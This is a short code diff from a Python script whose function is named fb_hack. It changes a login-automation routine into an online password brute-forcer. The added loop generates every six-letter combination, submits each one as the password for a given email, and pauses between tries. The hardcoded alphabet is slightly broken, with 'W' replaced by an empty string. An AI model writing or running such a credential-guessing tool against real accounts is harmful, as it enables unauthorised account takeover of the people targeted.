@@ -55,12 +55,20 @@ def fb_hack(email, codex):
   browser.click(coord=(428,18))
   browser.form['email'] = email
   browser.submit()
-  browser.select_form(nr=0)
-  browser.click(coord=(106.59,24))
-  response1 = browser.response()
-  soup = BeautifulSoup(response1, 'html.parser')
-  with open("output1.html", "w") as file:
-    file.write(str(soup))
+  counter = 0
+  for combination in itertools.product(["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
+    try:
+      p = (''.join(map(str, combination)))
+      browser.form['pass'] = p
+      print(p)
+      counter += 1
+      browser.submit()
+      sleepy(30)
+    except:
+      response1 = browser.response()
+      soup = BeautifulSoup(response1, 'html.parser')
+      with open("output1.html", "w") as file:
+        file.write(str(soup))
   browser.select_form(nr=0)
   forms = list(browser.forms())
   form = forms[0]
